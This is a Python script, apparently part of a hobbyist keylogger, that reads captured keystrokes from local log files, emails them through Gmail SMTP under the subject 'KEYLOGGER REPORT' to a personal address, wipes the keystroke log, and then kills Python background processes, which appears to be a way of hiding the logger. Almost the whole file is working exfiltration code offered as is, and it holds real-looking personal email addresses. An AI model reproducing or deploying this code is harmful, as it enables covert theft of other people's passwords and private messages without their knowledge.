from datetime import datetime
import time
from email.mime.text import MIMEText
from datetime import date
import smtplib, sys, csv
import wmi
import uiautomation as auto
import subprocess
import os,time

text=""


SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USERNAME = "aryak.deshpande05@gmail.com" 
SMTP_PASSWORD = "**********"
EMAIL_TO = ["mailmearyak@gmail.com"]
EMAIL_FROM = "aryak.deshpande05@gmail.com"
EMAIL_SUBJECT = "KEYLOGGER REPORT"
DATE_FORMAT = "%m/%d/%Y"
EMAIL_SPACE = ", "

def countdown(t):   
    while t: 
        mins, secs = divmod(t, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 		
        time.sleep(1) 
        t -= 1
        #to-do

def send_email():
    msg = MIMEText(text)
    LOG.close()
    msg['Subject'] = EMAIL_SUBJECT
    msg['To'] = EMAIL_SPACE.join(EMAIL_TO)
    msg['From'] = EMAIL_FROM
    mail = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    mail.starttls()
    mail.login(SMTP_USERNAME, SMTP_PASSWORD)
    mail.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
    mail.quit()

countdown(20) # will cause delay of n-seconds


actext=""
LOG = open('C:/Users/Aryak Deshpande/log.txt')
#write the keyboard text to log file
Lines = LOG.readlines() 
for line in Lines: 
    actext=actext+line.strip()

pt1=""
part1txt=open('C:/Users/Aryak Deshpande/log1.txt')
#write the keyboard text to log file
part1Lines = part1txt.readlines() 
for line in part1Lines: 
    pt1=pt1+line.strip()+"\n"


text = pt1+"Text was: "+actext
send_email()

fp2 = open('C:/Users/Aryak Deshpande/log.txt', 'w') 
fp2.truncate(0) #empty the log file
fp2.close() 



#code to kill the processes from task manager
ti = 0
names = ["pythonw.exe","pyw.exe"]
f = wmi.WMI()
for process in f.Win32_Process():
    if process.name in names:
        process.Terminate()
        ti += 1


